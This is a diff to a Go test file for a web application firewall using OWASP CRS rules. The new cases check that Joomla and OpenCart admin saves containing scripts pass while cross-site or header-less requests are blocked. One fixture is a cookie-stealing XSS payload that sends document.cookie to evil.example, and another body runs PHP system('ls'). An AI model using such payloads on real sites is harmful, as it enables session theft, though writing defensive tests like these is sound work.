@@ -44,6 +44,12 @@ func TestCustomerFalsePositivesWithCRS(t *testing.T) {
 		"&trackingcode=" + urlEncode(`<script async src="https://www.googletagmanager.com/gtag/js?id=G-ABC123"></script>`)
 	whmcsSess := "Cookie: WHMCSy551iLvnhYt7=0123456789abcdef"
 	self := "Referer: https://ssc.example.pk/alms/Teacher/Editing.php?id=4"
+	// Joomla: the session cookie is named by a hash; the administrator saves
+	// e-mail templates with markup and scripts, or edits files.
+	joomla := "Cookie: 5f2b8c1d9e4a7f3b6c0d8e2a1b9f4c7d=k3l9m2n8p4q7r1s5t6u0v2w8x3; joomla_user_state=logged_in"
+	joomlaAdmin := []string{joomla, "Sec-Fetch-Site: same-origin", "Referer: https://joomla.example.ir/administrator/index.php?option=com_rsmembership&view=configuration"}
+	template := "jform%5Bemail_body%5D=" + urlEncode(`<p>Dear {name},</p><p onclick="track()">Your membership is active.</p><script>window.dataLayer=window.dataLayer||[];</script>`) + "&task=configuration.apply&5f2b8c1d9e4a7f3b6c0d8e2a1b9f4c7d=1"
+	visitorXSS := "name=" + urlEncode(`<script>document.location='https://evil.example/?c='+document.cookie</script>`) + "&message=hi"
 
 	cases := []struct {
 		name, host, method, uri, ctype, body string
@@ -92,6 +98,11 @@ func TestCustomerFalsePositivesWithCRS(t *testing.T) {
 		{"Mobile app on XML-RPC", "blog.example.com", "POST", "/xmlrpc.php", "text/xml", `<?xml version="1.0"?><methodCall><methodName>wp.getPosts</methodName></methodCall>`, []string{"User-Agent: wp-android/24.1"}, 200},
 		// POSTs from tools without any browser header.
 		{"POST without User-Agent to a script", "site.example.com", "POST", "/old/includes/up.php", form, "a=1", []string{"User-Agent: "}, 403},
+		{"Joomla administrator saving an e-mail template", "joomla.example.ir", "POST", "/administrator/index.php?option=com_rsmembership&view=configuration", form, template, joomlaAdmin, 200},
+		{"Joomla administrator saving a file in File Explorer", "joomla.example.ir", "POST", "/administrator/index.php?option=com_ffexplorer&task=save", form, "content=" + urlEncode(`<?php defined('_JEXEC') or die; echo '<script src="/media/site.js"></script>'; ?>`), joomlaAdmin, 200},
+		{"Same save without the browser's same-site headers", "joomla.example.ir", "POST", "/administrator/index.php?option=com_rsmembership&view=configuration", form, template, []string{joomla}, 403},
+		{"Same save sent from another site", "joomla.example.ir", "POST", "/administrator/index.php?option=com_rsmembership&view=configuration", form, template, []string{joomla, "Sec-Fetch-Site: cross-site", "Referer: https://evil.example/administrator/x"}, 403},
+		{"Script in a Joomla visitor's form still refused", "joomla.example.ir", "POST", "/index.php?option=com_contact", form, visitorXSS, []string{joomla, "Referer: https://joomla.example.ir/contact"}, 403},
 		{"Payment callback without User-Agent", "site.example.com", "POST", "/modules/gateways/callback/jazzcash.php", form, "a=1", []string{"User-Agent: "}, 200},
 		{"Webhook without User-Agent", "site.example.com", "POST", "/app/webhook.php", form, "a=1", []string{"User-Agent: "}, 200},
 		{"API call without User-Agent", "site.example.com", "POST", "/api/v1/orders.php", form, "a=1", []string{"User-Agent: "}, 200},
@@ -111,5 +122,43 @@ func TestCustomerFalsePositivesWithCRS(t *testing.T) {
 	}
 	if !strings.Contains(sessionSetup(), "id:7700044") {
 		t.Fatal("session rule id")
+	}
+}
+
+// Admin areas on LiteSpeed: its ModSecurity ignores ctl:ruleRemoveByTag, so
+// the admin-panel exclusion (7700018) does nothing there and a Joomla
+// administrator's saves were refused (business600, 2026-10-19). With that
+// rule off, as on LiteSpeed, the threshold lift must carry them alone.
+func TestAdminAreaSavesWithoutRuleRemoval(t *testing.T) {
+	src := os.Getenv("XG_CRS_DIR")
+	if src == "" {
+		t.Skip("set XG_CRS_DIR to an OWASP CRS 4 checkout")
+	}
+	m := crsManager(t, src, `{"waf":{"enabled":true,"level":"normal","generic":true,"disabled_rules":[7700018]}}`, "off", nil)
+	if st := m.Status(); st.Error != "" {
+		t.Fatalf("WAF error: %s", st.Error)
+	}
+	form := "application/x-www-form-urlencoded"
+	joomla := "Cookie: 5f2b8c1d9e4a7f3b6c0d8e2a1b9f4c7d=k3l9m2n8p4q7r1s5t6u0v2w8x3"
+	own := []string{joomla, "Sec-Fetch-Site: same-origin", "Referer: https://joomla.example.ir/administrator/index.php?option=com_rsmembership"}
+	template := "jform%5Bemail_body%5D=" + urlEncode(`<p onclick="track()">Your membership is active.</p><script>window.dataLayer=window.dataLayer||[];</script>`)
+	file := "content=" + urlEncode(`<?php defined('_JEXEC') or die; echo '<script src="/media/site.js"></script>'; system('ls'); ?>`)
+	cases := []struct {
+		name, host, uri, body string
+		hdr                   []string
+		want                  int
+	}{
+		{"Joomla e-mail template", "joomla.example.ir", "/administrator/index.php?option=com_rsmembership&view=configuration", template, own, 200},
+		{"Joomla File Explorer save", "joomla.example.ir", "/administrator/index.php?option=com_ffexplorer&task=save", file, own, 200},
+		{"OpenCart product description", "shop.example.pk", "/admin/index.php?route=catalog/product.save", template,
+			[]string{"Cookie: OCSESSID=abc123", "Sec-Fetch-Site: same-origin", "Referer: https://shop.example.pk/admin/index.php?route=catalog/product.form"}, 200},
+		{"Without the browser's same-site headers", "joomla.example.ir", "/administrator/index.php?option=com_rsmembership&view=configuration", template, []string{joomla}, 403},
+		{"From another site", "joomla.example.ir", "/administrator/index.php", template, []string{joomla, "Sec-Fetch-Site: cross-site", "Referer: https://evil.example/administrator/"}, 403},
+		{"Customer dashboard is not an admin area", "smm.example.pk", "/dashboard/profile", template, []string{"Cookie: PHPSESSID=abc", "Sec-Fetch-Site: same-origin", "Referer: https://smm.example.pk/dashboard/"}, 403},
+	}
+	for _, c := range cases {
+		if got := sendBody(t, c.host, "POST", c.uri, form, c.body, c.hdr...); (got == 403) != (c.want == 403) || got == 0 {
+			t.Errorf("%s: got %d, want %d", c.name, got, c.want)
+		}
 	}
 }
